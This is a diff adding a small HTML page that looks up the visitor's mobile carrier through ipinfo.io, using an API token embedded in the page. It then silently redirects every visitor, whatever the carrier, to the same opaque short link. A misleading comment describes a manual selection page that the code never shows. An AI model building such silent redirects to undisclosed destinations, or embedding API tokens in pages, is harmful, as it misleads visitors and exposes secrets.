@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Carrier Redirect</title>
+  <script>
+  fetch("https://ipinfo.io/json?token=f66e0e91b56461") // replace with your token
+  .then(res => res.json())
+  .then(data => {
+      let carrier = (data.org || "").toLowerCase();
+
+      if(carrier.includes("mtn")) {
+          window.location.replace("https://lgamiwhirl.com/8KgVJ");
+      } else if(carrier.includes("airtel")) {
+          window.location.replace("https://lgamiwhirl.com/8KgVJ");
+      } else if(carrier.includes("glo")) {
+          window.location.replace("https://lgamiwhirl.com/8KgVJ");
+      } else {
+          // Fallback: show a manual selection page
+          window.location.replace("https://lgamiwhirl.com/8KgVJ");
+      }
+  })
+  .catch(err => {
+      window.location.replace("https://lgamiwhirl.com/8KgVJ"); // API failed
+  });
+  </script>
+</head>
+<body>
+</body>
+</html>
